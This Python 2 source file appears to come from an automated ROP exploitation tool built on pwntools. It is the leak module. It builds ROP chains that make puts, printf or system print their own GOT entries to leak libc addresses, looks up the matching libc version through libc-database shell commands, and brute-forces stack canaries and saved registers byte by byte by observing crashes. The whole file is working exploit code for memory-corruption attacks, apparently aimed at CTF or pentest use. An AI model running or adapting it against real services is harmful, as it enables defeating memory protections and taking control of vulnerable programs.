from pwn import *
from utils import *

# Author: xct

class Leak():

	def __init__(self, ropstar):
		self.ropstar = ropstar
		self.binary = self.ropstar.binary		
		self.arch = self.ropstar.arch
		self.libcdb_path = self.ropstar.home+'/tools/libc-database/'
		self.leak_parse_amd64 = {
		  'puts': lambda line: line.strip()[:6]+ '\x00\x00',
		  'printf': lambda line: line.strip()[:6]+ '\x00\x00',
		  'system': lambda line: line.strip()[7:(7+6)].ljust(8, '\x00'),
		}
		self.leak_parse_i386 = {
		  'puts': lambda line: line.strip()[:4],
		  'printf': lambda line: line.strip()[:4],
		  'system': lambda line: line.strip()[7:(7+4)].ljust(4, '\x00')
		}
		if self.ropstar.arch == 'amd64':
			self.px = lambda x : p64(x)
			self.ux = lambda x : u64(x)
		else:
			self.px = lambda x : p32(x)
			self.ux = lambda x : u32(x)
		self.bytes = ''
		for i in range(0x100):
			self.bytes += chr(i)
		self.temp_payload = ''


	def ident_libc(self, leak):
			''' gets libc from libcdatabase
			'''
			# check which versions it could be
			task = self.libcdb_path+"find "
			for k,v in leak.items()[-3:]: # more than 3 are not supported
				task += k + " " + hex(v)[-3:] + " "
			log.info(task)
			p = subprocess.Popen(task, stdout=subprocess.PIPE, stderr=None, shell=True)
			out = p.communicate()[0]
			versions = []
			pattern = ".*id (.*)\)"
			for version in out.split('\n'):
				m = re.search(pattern, version)
				if m:
					versions.append(m.groups(1)[0])
			log.info(versions)
			# copy them to a local dir
			for version in versions:
				task = self.libcdb_path+"download "+version
				p = subprocess.Popen(task, shell=True)
				p.communicate()
				task = "cp "+self.libcdb_path+"libs/"+version+"/libc.so.6 ./"+version
				p = subprocess.Popen(task, shell=True)
				p.communicate()
			return versions


	def leak_libc(self, p):
		''' Leaks libc
		'''
		leak = {}
		log.info(self.binary.got.keys())
		if 'main' in self.binary.symbols.keys():
			main = self.binary.symbols['main']
		elif self.ropstar.args.m:
			try:
				main = self.ropstar.args.m	
				main = int(main, 16)
				if self.ropstar.binary.pie:
					main += self.ropstar.binary.address
				log.info("Main: "+hex(main))
			except AttributeError, TypeError:
				log.failure("Could not get leak, no main method found (please specify with -m)")
				exit(0)
		else:
			log.failure("Could not get leak, no main method found (please specify with -m)")
			exit(0)
		leak_funcs = ['puts','printf','system']
		for leak_func in leak_funcs:
			if leak_func in self.binary.got.keys():
				log.info('Using '+leak_func)							
				rop = ROP(self.binary)
				if leak_func == 'printf':
					rop.call(self.binary.plt[leak_func], [self.binary.got[leak_func],"%s"])
				else:
					rop.call(self.binary.plt[leak_func], [self.binary.got[leak_func]])
				rop.call(main)				
				if self.ropstar.binary.canary:	
					log.failure("Leaking/Exploitation not yet implemented for canary/pie binaries")				
					exit(0)
				else:
					payload = fit({self.ropstar.offset:rop.chain()})
				try:
					log.info(rop.dump())
					result = self.ropstar.trigger(p, payload)	
				except EOFError:
					log.failure("Leak caused segfault")
					continue
				lines = []	
				if isinstance(result, basestring):				
					lines = result.split("\n")
				else:
					lines = result			
				for line in lines:
					print(repr(line))
					try:
						if self.arch == 'amd64':
							l = self.leak_parse_amd64[leak_func](line)							
							if l[5] == '\x7f':
								leak[leak_func]  = u64(l)						
								log.success("Leak "+leak_func+" : "+hex(leak[leak_func]))
								break
						elif self.arch == 'i386':
							l = self.leak_parse_i386[leak_func](line)														
							if l[3] == '\xf7':
								leak[leak_func]  = u32(l)				
								log.success("Leak "+leak_func+" : "+hex(leak[leak_func]))	
								break	
					except (struct.error,IndexError):
						pass
				if len(leak) > 0:
					save('leak', payload)
					# at least one leak found, exit
					break	
		return leak


	def leak_byte(self, byte):
		''' Leaks a byte by observing if it crashes (used for canary/rbp/rip)
		'''
		found = False		    
		p = self.ropstar.connect() 
		result = self.ropstar.trigger(p, self.temp_payload+byte, newline=False, recvall=True)
		if self.ropstar.success_marker in result:
			print "Found byte {}".format(repr(byte))
			found = True
		p.close()
		return found   


	def leak_qword(self, payload):
		'''  Leaks 8 bytes using the leak_byte method
		'''
		v = ''  		
		for _ in range(8): 
			# this will not use trigger so we have to encode ourselves       
			self.temp_payload = payload+v			
			try:
				s = pwnlib.util.iters.bruteforce(lambda x: self.leak_byte(x), self.bytes, 1, method='fixed')
				v += s
			except TypeError:
				log.failure("Could not find value")
				return v
		if len(v) == 8:
		    log.success("Retrieved: " + str(hex(u64(v.rjust(8, "\x00")))))
		    return v
		log.failure("Failed to bruteforce value at offset "+str(len(payload)))
		exit(0)
